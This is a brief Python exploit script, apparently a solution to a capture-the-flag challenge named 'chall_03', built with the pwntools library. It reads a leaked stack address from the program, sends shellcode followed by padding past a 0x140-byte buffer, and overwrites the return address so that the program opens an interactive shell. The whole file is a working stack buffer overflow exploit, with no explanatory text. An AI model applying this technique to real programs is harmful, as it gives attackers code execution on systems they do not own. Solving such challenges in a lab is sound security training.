# coding: utf-8
from pwn import *
def chall03():
    context.arch="amd64"
    p=process("./chall_03")
    print(p.recvuntil("leak :)"))
    leak = p.recv()
    print(leak)
    intleak = int(leak,16)
    shell = asm(shellcraft.sh())
    lenshell = len(shell)
    p.sendline(shell + b"a"*(0x140-lenshell+8)+p64(intleak))
    p.interactive()
    p.close()
    
    
